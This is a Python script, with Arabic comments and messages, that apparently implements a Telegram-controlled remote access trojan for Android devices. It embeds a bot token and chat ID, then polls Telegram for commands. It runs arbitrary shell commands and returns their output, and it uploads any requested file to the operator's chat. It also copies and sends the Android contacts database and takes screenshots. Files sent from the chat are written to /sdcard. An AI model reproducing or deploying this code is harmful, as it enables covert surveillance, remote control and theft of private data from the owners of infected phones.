import os, sys, time, requests, subprocess, shutil, threading
from datetime import datetime

# ======== التُّوكِنُ مُضَمَّنٌ مُبَاشَرَةً (لَا حَاجَةَ لِـ config.py) ========
BOT_TOKEN = "88516176066:AGAGM7GVC3BK0CUR9R6bAQHrvKERCxRYoc"
CHAT_ID = "7399463177"

if not BOT_TOKEN or not CHAT_ID:
    print("ERROR: BOT_TOKEN or CHAT_ID not set!")
    sys.exit(0)

BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"
LAST_UPDATE = 0

def send(txt, parse='Markdown'):
    try: requests.post(f"{BASE}/sendMessage", data={"chat_id": CHAT_ID, "text": txt, "parse_mode": parse})
    except: pass

def send_file(path, cap=""):
    try:
        with open(path, 'rb') as f:
            requests.post(f"{BASE}/sendDocument", files={'document': f}, data={"chat_id": CHAT_ID, "caption": cap})
    except: pass

def execute(cmd):
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
        out = (res.stdout + res.stderr).strip()
        if not out: out = "(لا يوجد مخرجات)"
        if len(out) > 4000: out = out[:4000] + "
...مُقْتَطَع"
        send(f"💻 *{cmd}*
```
{out}
```")
    except Exception as e: send(f"خطأ: {e}")

def listen():
    global LAST_UPDATE
    while True:
        try:
            url = f"{BASE}/getUpdates?offset={LAST_UPDATE+1}&timeout=5"
            r = requests.get(url, timeout=10).json()
            if r.get('ok') and r.get('result'):
                for u in r['result']:
                    LAST_UPDATE = u['update_id']
                    msg = u.get('message')
                    if not msg or msg.get('chat',{}).get('id') != int(CHAT_ID): continue
                    txt = msg.get('text', '')
                    doc = msg.get('document')
                    if doc:
                        file_id = doc['file_id']
                        file_name = doc.get('file_name', 'unknown.bin')
                        file_info = requests.get(f"{BASE}/getFile?file_id={file_id}").json()
                        file_path = file_info['result']['file_path']
                        down_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
                        content = requests.get(down_url).content
                        save_as = f"/sdcard/{file_name}"
                        with open(save_as, 'wb') as f: f.write(content)
                        send(f"✅ تم تحميل الملف `{file_name}` إلى `/sdcard/`")
                        continue
                    if txt.startswith('/run'):
                        threading.Thread(target=execute, args=(txt[5:].strip(),), daemon=True).start()
                    elif txt.startswith('/dl'):
                        path = txt[4:].strip()
                        if os.path.exists(path) and os.path.isfile(path):
                            send_file(path, f"📂 {path}")
                        else: send(f"الملف {path} غير موجود")
                    elif txt == '/contacts':
                        try:
                            shutil.copy("/data/data/com.android.providers.contacts/databases/contacts2.db", "/sdcard/contacts.db")
                            send_file("/sdcard/contacts.db", "📇 جهات")
                            os.remove("/sdcard/contacts.db")
                        except: send("فشل")
                    elif txt == '/ss':
                        os.system("screencap -p /sdcard/s.png")
                        if os.path.exists("/sdcard/s.png"):
                            send_file("/sdcard/s.png", "🖼️ شاشة")
                            os.remove("/sdcard/s.png")
                    elif txt == '/help':
                        send("📜 الأوامر:
/run <cmd>
/dl <path>
/contacts
/ss
📤 أرسل ملف للتحميل")
        except: pass
        time.sleep(1)

if __name__ == "__main__":
    send("☠️ *جُنْدِيُّ دوكر يَعْمَلُ* ☠️")
    listen()
